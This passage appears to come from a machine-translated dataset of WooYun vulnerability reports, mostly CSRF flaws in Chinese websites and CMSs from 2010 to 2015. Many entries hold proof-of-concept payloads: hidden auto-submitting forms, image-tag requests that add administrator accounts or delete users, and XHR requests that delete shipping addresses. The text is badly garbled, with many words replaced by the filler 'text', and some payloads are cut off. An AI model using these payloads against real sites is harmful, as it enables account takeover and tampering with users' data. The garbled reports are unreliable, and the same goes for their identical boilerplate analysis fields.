**Fix**: 1.CAPTCHA is considered a defense againstCSRFattacks and the simplest effective defensive method.2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2015-094436] translated textvulnerabilitytextofCSRF(cantext)
**Vendor**: hongxiu.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textone locationtextvalidation,causingCSRF vulnerability,attackercanexploitthisvulnerabilitytext

**POC**: 1,weopenarbitraryonetext,thentexttothattextundertexthasonetextpackettranslated text(thisisauthortranslated text)2, weuseBurp truncationoneunderlook atlook at,foundnotextvalidation~~,wetextnextconstructoneform3,constructformas follows<html><body><form id="post123" name="post123" action="https://example.com/[redacted]" method="POST"><input type="hidden" name="txtExpense" value="1" /><input type="hidden" name="txt

**Bypass**: Direct exploitation

**Fix**: addtokenoftextvalidationtext
---

---
### [wooyun-2014-054655] Discuz! X2.5 / X3 / X3.1 canCSRFtextadministrator account
**Vendor**: Discuz! | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: authentication interface, admin backendmanagement

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: on timesthatvulnerability:WooYun: Discuz! X2.5 / X3 / X3.1inCSRFattackdefensecanbeBypassyoureplytextisprogramtextasnotneedtranslated textthistextset......thatthistextshouldtextistranslated textissueadmin backenddeleteuserpageonlyissingletextsubmitcheck('submit', 1),textbeforetext,programherenotextformhash,textthenistextcanuseforCSRFnottextexploitthisvulnerabilityprerequisiteistextadministratorlog inadmin backend,nottextthisnotwilltranslated text(for exampletextaddpointtranslated textentertextthentextadministratortriggertext,textinnotlinetextcanposttext)

**POC**: posttext Discuz! code:[img]admin.php?frame=no&action=members&operation=clean&submit=1&uidarray=1&confirmed=yes[/img]itsinmodifyuidarraycandeletemanyspecified userbedeleteafteradministratorwilltranslated textlog in,textlog inafterwilltextucentertext(discuzdatadatabaseinsideusertextbedelete),textafterlostmanagementtextontextcodetextaddmodifycanindeletesametranslated textpostdata,translated textItextnottext......

**Bypass**: filterBypass

**Fix**: formhashtext
---

---
### [wooyun-2015-0105354] a certain textAPPtwolocationcsrf,texthastext
**Vendor**: a certain Internet company | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: issueappearinfollowandgoodtextlocationusetext peopletestaccounttestunder,translated textpersonalfollowunder,textpacket,thengetfollowa certain translated textlinkputaddresssendtextItextoneaccountfollowsuccessgoodtextthattextonetext,nottranslated textcangoodtextsuccess.thisunderthencantranslated text,textgoodsetonetranslated text,translated textsendmessage,textnottextcantext peopletext!translated text

**Bypass**: Direct exploitation

**Fix**: tokentext?
---

---
### [wooyun-2014-071537] useonelowtextvulnerabilitytranslated textusermobile phoneadmin backendtranslated textandinstallarbitrarytextuse
**Vendor**: translated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface, admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated texthearttextcloudtextfunctionalityonlytextuserinmobile phoneclientlog inandtextcloudtext,thattextwebpageontextonepoint,textusethentextstartinmobile phoneondownload,butcloudtextthistranslated textfunctionalitytextandnotextCSRFprotection,translated textusertextcomerisk.weclickcloudtranslated text,sametextcapture packets,foundis justPOSTrequest,buttextprogramtextPOSTandGETnottext,causingcandirectlyuseGETsendtogetherrequest,for exampletext"Sogoutextinput method"requestas follows:https://example.com/[redacted]

**POC**: textquestionafterbrowsertext:textrequestsuccess,Iusemanyaccountenterlinetry,translated textsuccessvulnerabilityimpact:1.inusernottranslated textundertextandcanadmin backendtextinstallarbitrarytextuse2.textforthisrequestcanunlimited timessendtogether,ifoneusertext timesinnottranslated textundersendtogetherthisrequest(for exampleintranslated textforummanypostinsidetextthisrequest)canenterlinetext(IselfthenbetenseveralSogoudownloadtranslated text)Ps.text peopletranslated textusertext peoplelargetextcangood?

**Bypass**: Direct exploitation

**Fix**: CSRFdefensetext:key pointfunctionalityonetranslated textCSRFdefense,POSTandGETrequesttranslated text,addTOKEN,textthisTOEKtranslated text,textnottextthentextis onelook attogethercometext"lowtext"vulnerability,textcancauseserioustext
---

---
### [wooyun-2013-036933] XCar.com.cn CSRFtextpostfavoritetextpopularity
**Vendor**: XCar.com.cn | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: yousendtextmessagetextCSRFdefensetranslated textgood.favoritepostthisfunctionalitytextisGETrequesttextnocontrolsource,impactserious!textcopyonlook atonetextthenfavorite.translated texttotwo peopletextGETtypeCSRF,constructas follows:https://example.com/[redacted]

**POC**: textposttranslated textpopularitytext 104 ,textwilltext

**Bypass**: Direct exploitation

**Fix**: requesting a reward!
---

---
### [wooyun-2013-035624] a certain portal siteCSRFtextone:textwormcometranslated textsome
**Vendor**: a certain portal site | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: issueURL: https://example.com/[redacted] canCSRFsenda certain social platform.undertextcomelook atlook attextexploit

**POC**: throughhostURLIconstructonepayload ,openaftertextPOSTonetexta certain social platform,thenetc.5translated texttospecifiedaddress.<meta http-equiv="content-type" content="text/html;charset=utf-8"><h1>textintext...</h1><iframe id="test_iframe" src="https://example.com/[redacted]" style='display:none'></iframe><script>function CSRF(){test_iframe.document.write("<form id='test_form' actio

**Bypass**: Direct exploitation

**Fix**: translated textIgoodtext...
---

---
### [wooyun-2015-0135715] a certain alsotextplatformone locationCSRF vulnerability(can modifyuserpassword)
**Vendor**: a certain alsotextplatform.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: issuetextin profilelocationtextforisGETrequestdirectlyconstructundertextlink,https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-035719] a certain search enginea subsitecontinue boosting followerstwo
**Vendor**: a certain search engine | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1,followthisgirlhttps://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textusepostsubmit,addtoken
---

---
### [wooyun-2013-027706] texta certain serioustext+textsingletext+textCSRF
**Vendor**: texta certain e-commerce platformelectronictexthastextcompany | **Year**: 2013 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1#textsitehttps://example.com/[redacted] /lifesquare/homePage/ajax/sendMessage.htm HTTP/1.1phoneNumId=cantranslated text&sendInfo=%E7%BB%B4%E5%88%A9%E5%BA%B7(%E8%8B%9C%E8%93%BF%E5%9B%AD%E5%BA%97)%3A%E7%99%BD%E4%B8%8B%E5%8C%BA%E7%9F%B3%E9%97%A8%E5%9D%8E165%E5%8F%B7%E7%94%B5%E8%AF%9D%EF%BC%9A025-58854808+http%3A%2F%2Fmeishi.suning.com%2Fl

**POC**: 2#textsingletexthttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: textItranslated text-
---

---
### [wooyun-2011-01224] 115text CSRF vulnerability
**Vendor**: 115.com | **Year**: 2011 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 115text https://example.com/[redacted] large amount ofuse AJAX cometriggeruseroperation, text AJAX requestnottextnouse CSRF token, textused GET cometrigger, causingcantextconstructtext URL cometriggeroperation

**POC**: intextforumpublishonelinkto https://example.com/[redacted] imagethen can, ifusertextquestionthispagetranslated textlog intext 115text, textwillinuserdirectorytextonetextfb5672 directory

**Bypass**: Direct exploitation

**Fix**: use POST textnotis GET comeenterline AJAX, andtextuse CSRF TOKEN comedefensetextfor POST  CSRF attack
---

---
### [wooyun-2013-043900] a certain textserviceCSRF
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: textquestion:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: token.deleteuserintext,modifyhassametextissuenotagainprove.deleteisgetrequest,CSRFtextgoodexploitsome.
---

---
### [wooyun-2014-076014] METINFO CSRFcanaddadministrator
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textformetinfointexthearttext,hasvariableoverwritevulnerability (nottextisnotis)soGET = POST , POST = GETforiscanuseGETrequestcomeaddadministrator,textaddadministratorpagenotextTOKENprotectionItexttryadd peopleadministrator,thenuseBurpSuitecapture packets,againputPOSTrequesttextnext,puttextGETrequestin.construct peopleCSRF URLlocalhost/metinfo/admin/admin/save.php?action=add&useid=hacked&pass1=hacked&pass2=hacked&name=Hacked&sex=0&tel=&mobile=01234567890&email=hacked%40hacked.com&a certain Internet company=&msn=&taobao=&admin_introduction=&admin_group=3&langok_cn=cn&admin_op0=metinfo&admin_op

**POC**: puthostrequestputto <img> inhtmlsource codeis<img src="http://localhost/metinfo/admin/admin/save.php?action=add&useid=hacked&pass1=hacked&pass2=hacked&name=Hacked&sex=0&tel=&mobile=01234567890&email=hacked%40hacked.com&a certain Internet company=&msn=&taobao=&admin_introduction=&admin_group=3&langok_cn=cn&admin_op0=metinfo&admin_op1=add&admin

**Bypass**: Direct exploitation

**Fix**: addTOKENprotection
---

---
### [wooyun-2012-07600] Xweibopluginone locationcsrf
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Xweibopluginone locationcsrfcantextcanceltranslated texta certain social platformbind

**POC**: src=https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: .
---

---
### [wooyun-2013-044692] Dianpingone locationcsrfvulnerability
**Vendor**: Dianping | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textastranslated textItwo peopletext?textastextthennottextsendonerewardtextI? textastexthttps://example.com/[redacted] textastextthistranslated text
---

---
### [wooyun-2015-0132870] translated textarbitraryresetpasswordvulnerability(CSRF)
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: herehas peoplemodifytextemailwecapture packetslook atlook atget methodsubmit textthenisCSRFwetextquestionunder

**POC**: youtranslated textItextnotextcantextalltranslated text textnottranslated textthenIthennottest,vulnerabilitytexthas

**Bypass**: Direct exploitation

**Fix**: validationtoken
---

---
### [wooyun-2012-09090] forWooYun-2012-08606again timesCSRFexploit
**Vendor**: Aipai | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 21numbersubmitvulnerability,whentextthentextvulnerability,translated text.thistext,againonAipaiwhenfound,followerstextintext,thentextlook atlook attranslated text.intextexploitthisaddressinnosourcetextundersubmit,informationtranslated text"notextrequestmethod",translated textisFixtext.beforeIinBBSintextuseimgtranslated textusetextthisaddress,willnotwillisthisissuetext,foris,Ithenagainone timesuseimgtranslated textusethisaddress,translated text.textoneunder,hasfollowers,Ilook atlook atfollowersnamedtext,fortextothertranslated textnamedtext,textaffected.so,cantranslated textisthis wayFix:setinterfaceonlytextcomes from*.aipai.comrequestthis wayFixtextishasissue,notexttocomes fromforumcall,forumaddressisbbs.aipai.com,sothenthroughinterfacesourcecheck.inforuminenterlineCSRFeffecttextgood,becauseuserallislog instatus,impacttextlarge.

**POC**: inBBStextin,personaltextnamedintextuseundercode.[img]https://example.com/[redacted]]&callback%09=scribeSuccess_new&action=addSubscribe[/img]

**Bypass**: Direct exploitation

**Fix**: againtextonepointinterfacesourcecheck,userfollow/add followtextallisinvideotextin,soputinterfacesourcesetsettextonlytextwww.aipai.comrequest,sametextusePOSTtextGET,addTOKENtextistranslated text.Ps,translated textimlonghao(textnumber:11709754)allfollowers,ordirectlytext(Inottranslated textAipai - -||).locationhandleunder
---

---
### [wooyun-2015-0129301] texta systemvulnerabilitycan modifyuserpassword(demotext,generic)#2
**Vendor**: fanwe.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: https://example.com/[redacted] action="https://example.com/[redacted]" method="POST"><input type="hidden" name="email" value="296864045@some-domain.com" /><input type="hidden" name="user_name" value="hackimg" /

**Bypass**: Direct exploitation

**Fix**: addvalidationtext.text:textcompanytextsendsystemalreadyhastwotexthasthis wayvulnerabilityhas,thisisIsubmitNo.twosystemsendtextsametextissue,texthasonetextthenispasswordalreadymodify,accounttextislog instatus!
---

---
### [wooyun-2014-067384] phpokcms 4.x CSRF vulnerability
**Vendor**: phpok.com | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: phpokcmshascsrfvulnerability,administratorchecklook atwilltranslated textnottextnottextwilltextaddtextsystemadministrator.textinwilltranslated textlocationimgtext,textfortextcommentcantranslated text,textcanwormsendcomment.undertextproveaddadministratortext.textcodeanalysis,directlypoc.

**POC**: textwilltextafteropenas followslink.(domain namepathtranslated textmodify)http://[IP redacted] passwordasadmin2systemadministratoralreadyaddsuccess.)againopenset,administratortranslated textlook atoneunderthen can.

**Bypass**: Direct exploitation

**Fix**: modifysettextinterface,puturltext. sametextaddtextfortextfunctionalitycsrfcontrol,addtexttwo timestext,ortoken.
---

---
### [wooyun-2013-040569] largetextcsrfasspecifiedcompanyboost followers
**Vendor**: largetranslated textsendtext(text)hastextcompany | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: text.largetranslated texthasfollowerscantext...fortextoneunder.foundpopularitytranslated textnotis onetextlarge.whenIclickfollowwhen,willsendtextthis wayonepostrequestsingletextrequestoneunderfoundtranslated textfollow.textaccountasb,clicktextrequest.foundaccountbtextfollowtextcompany.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0128126] translated textundertexthasCSRF vulnerability
**Vendor**: translated textgroup | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]  canaddaddshipping addresshttps://example.com/[redacted]

**POC**: deleteshipping address   idtranslated textPOC<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="memberAddressId" value="3800" /><input type="hidden" name="isDefault" value="" /><input type="hidden" name="address1" value

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2014-068706] textsiteoftextsensitivefunctionalitycsrf candumpdatadatabase
**Vendor**: textsiteoftext | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: admin backendbackupdatadatabasefunctionalitynodefensecsrf.causingcsrf dumpdatadatabase.datadatabasenamedtextcantext,pathknown.inuseunderpathcantexttobackupdatadatabasefunctionality.thisrequestas follows:nodefensecsrfbackupdatadatabasenamedtextcantranslated text,pathknown.candirectlyobtainto.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-017947] translated texta certain social platformworm
**Vendor**: translated text | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: exploittranslated textenterlinewormplant malware textchain boost followers text textadmin backendtextcantextarbitrarytextaccountpassword textistextnamedtext....look atundertextpublishaboutyouvulnerabilitytextnottranslated text translated textnameddata translated text namedtext allhas black-market operatorstext

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textwebsitetranslated text..key pointtextgoodfilter youtext
---

---
### [wooyun-2015-0125211] translated textarbitrarychangetextshipping addressCSRF vulnerability
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: look attoshipping address textcapture packetschecklook atunder foundisgetmethodsubmit,textCSRF vulnerabilityone issueweconstructpocok  wetext peopleaccountwetextquestionpoc  textlook atresult

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: addtokenthencan
---

---
### [wooyun-2015-0142622] a certain video site csrf obtaintranslated textlook attext
**Vendor**: a certain video site.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textapiis:https://example.com/[redacted] domain="*" secure="false"/></cross-domain-policy>useflashthen candirectlyGettojsonthenposttoselfserveronthenline

**POC**: Iuseajaxfcreateonepage,victimonlytextquestionthispage,translated textandusermidthenwillbeuploadtotextserverwhenin.victimneedtexthasa certain video sitecookie,textintext.attacktext<video href="https://example.com/[redacted]"/>translated texta certain video sitecloudwilltext,textputthenunder..translated text10translated textusernamedcting00textaftertextftpserverontxtinsideusernamedonetext,textlook attranslated textonetext.

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2010-0641] a certain social platformCSRFexploit2:textaddfollow,andtextsenda certain social platform
**Vendor**: a certain Internet company | **Year**: 2010 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: log inaftertextquestionconstructtextform,thencanadd"translated text"asfollow.

**POC**: <form method="POST" name="CSRF" action="https://example.com/[redacted]"><input type="hidden" name="name" value="value"/></form><script>document.CSRF.submit();</script>

**Bypass**: Direct exploitation

**Fix**: you know what to do
---

---
### [wooyun-2013-020973] textcloudzoneone locationcsrfcausingarbitraryaddtext
**Vendor**: textcloudofficial | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: addtextlocationnotvalidationtoken,textrequestasget,as followshttps://example.com/[redacted] src="https://example.com/[redacted]"/](thislocation&n=.jpgisastranslated textimage,textcantextload)

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2015-0100519] bagecms csrfcanobtainarbitrarydata
**Vendor**: bagecms.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: addadministratorwhen,burp suiteintercept,foundhascsrfcsrf poc<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="http://localhost/bagecms/index.php?r=admini/admin/create" method="POST"><input type="hidden" name="Admin&#91;username&#93;" value="test" /><input type="hidden" name="Admin&#91;password&#93;" value="test" /><input type="hidden" name="Admin&#91;email&#93;" value="test&#64;test&#46;

**POC**: addadministratorsuccessadministratorlog in,canobtaindatadatabaseinformationetc.

**Bypass**: Direct exploitation

**Fix**: recommendaddrequesturloperationpermissions,oraddalltextcsrfdefenseaddtokenvalidationHTTPtextRefereruseXMLHttpRequestwithaddinheaderinside
---

---
### [wooyun-2015-0125210] Jiapin.com csrftextone issue textdeletetextshipping address
**Vendor**: Jiapin.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: deleteshipping address1,capture packetscreateshipping address2constructcsrflink,main code:xmlhttp.open("get", "https://example.com/[redacted] ", true);textquestiontextrequestshipping address,textbesuccessdelete.text,checklook atshipping address,validationunderaddress_idas6textnumbertext,completelycantext,aftertextnotext

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: addtokenvalidationreferer
---

---
### [wooyun-2010-0592] a certain search enginespacetextinCSRFwormtext
**Vendor**: a certain search engine | **Year**: 2010 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain search enginewapandwebcookietextusetext,log inwebafterthentextlog inwap,textwapinterfacetranslated text,textforattack.wapsendarticlelocationdatasubmitTypetextisPost,translated text,Getsubmitaftertextcansuccess,andtextthisinterfaceandnoTokenoftextvalidation,textoneneedtextiswhentextuserusernamed,thiscantextSOBB-05inmethodobtain.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: webandwapcookietext.
---

---
### [wooyun-2014-048752] a certain video siteone locationCSRFtextfollow
**Vendor**: text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: noforreferervalidation,noaddtokencausing

**POC**: textonetextuserenterlinefollowthencapture packetsgetisPOSTsubmittextquestionas followspocpage<html><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><body><form name="csrf" action="https://example.com/[redacted]" method="POST"><input type=text name="star_uids" value="2108875392"></input><input type="submit" value="submit" /></form><s

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceReferer,inPOSTinformation add to tokenrewardnottext,translated textistext.
---

---
### [wooyun-2013-016118] a certain social platformemailtextcsrf,textnamedsingletextset
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: emailinsettextnamedsinglewhenhascsrf,textcompletelynotextwhetherwhentextuser,impacttextistextlarge,textusetext:1.for exampletextputIaddtextnamedsingle,Iusetextonetextsendemail,textclickafterputtextnamedsingleemailaddresscantranslated textnamedsingle2.for exampleItextfortextonetextandonecompanyorpersonalemailtextcome,Icansendemailtextputthatpersonalortextdirectlyaddtextnamedsingle,textthatpersonaltextcopydo not knowpersonaltextasdirectlyaddtextnamedsinglemethodimpacttextlarge,for exampletextonmalicioustext,textafterchecktextcomeisa certain social platformemailissueifthentext

**POC**: text peopleaddtextnamedsingleput,textnamedsingleandtranslated textnamedsingleshouldtexthasthisissue<html><body><form id="wrhoooo" name="wrhoooo" action="https://example.com/[redacted]" method="post"><input type="test" name="items" value="test@123.com" /><input type="test" name="blacklist" value="1" /><input type="test" name="a" value="add_antispam" /><

**Bypass**: Direct exploitation

**Fix**: addonetexttoken,validationunderreferer,translated text,textbeBypass
---

---
### [wooyun-2015-0155302] translated textdeleteshipping addresshascsrf
**Vendor**: gaitu.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: deleteshipping addresslocationhascsrf,othertranslated textonetextcheck.deleteshipping address,capture packetstext;canlook attomessagetextintexthascsrf_tokenParameters,buttextastext,becauseitsastextvalue,textaddressidastextnumbertranslated textvalue,textnothasnotcantextParameters,textmaliciouslink,textcode is as follows:xmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("ajaxType=8&id=142623&csrf_token=7068c3f1-ffd9-4215-bd29-a559011b4c67");textquestionthislink:text,addresstextbesuccesstext

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: validationreferertexttoken
---

---
### [wooyun-2015-0108173] PHPSHE csrfmodifyadministratorpassword
**Vendor**: phpshe.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1,onelook atmodifyadministratorpasswordnottextpasswordvalidationcapture packetschecklook atnotoeknvaluevalidation2,constructformenterlinemodifytextmodifynottextthis waysendtextmanagementonelook atthentextbemodify3, wecreateonehtml,code is as follows<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>textcloudtest</h1></td></tr></tbody></table><<meta http-equiv="refresh" content="4;url=https://example.com/[redacted]"> <!--text

**POC**: 1,onelook atmodifyadministratorpasswordnottextpasswordvalidationcapture packetschecklook atnotoeknvaluevalidation2,constructformenterlinemodifytextmodifynottextthis waysendtextmanagementonelook atthentextbemodify3, wecreateonehtml,code is as follows<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>textcloudtest</h

**Bypass**: Direct exploitation

**Fix**: token valuevalidationtexthasmodifytextpasswordvalidation
---

---
### [wooyun-2015-0122200] textfma certain sitehashearttranslated textvulnerability
**Vendor**: qingting.fm | **Year**: 2015 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1,address:https://example.com/[redacted] openssl.py star.cms.qingting.fm|more >>E:\qingting.fm.txt<code>Connecting...Sending Client Hello...Waiting for Server Hello...... received message: type = 22, ver = 0302, length = 66... received message: type = 22, ver = 0302, length = 3685... received message: type = 22, ver = 0302, length = 331... received message: type = 22, ver = 0302, length = 4S

**POC**: as above

**Bypass**: Direct exploitation

**Fix**: upgradeFix!~~~
---

---
### [wooyun-2015-0135108] translated textCSRFcanhijackshipping address
**Vendor**: shouliwang.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1,addshipping address,capture packetstextPOC2,POC:<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="sysNo" value="" /><input type="hidden" name="name" value="test" /><input type="hidden" name="address" value="test" /><input type="hidden" name="district" value="3544" /><input type="hidden" name="cellPhone" value="13278721234" /><input type="hi

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: token
---

---
